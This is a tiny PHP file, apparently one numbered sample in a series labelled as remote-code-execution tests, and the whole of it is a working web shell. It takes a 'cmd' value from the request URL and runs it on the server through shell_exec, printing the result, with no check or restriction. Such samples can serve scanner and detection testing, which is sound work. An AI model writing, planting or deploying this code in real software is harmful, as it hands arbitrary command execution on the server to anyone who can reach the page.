<?php
// RCE test variation #1346
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>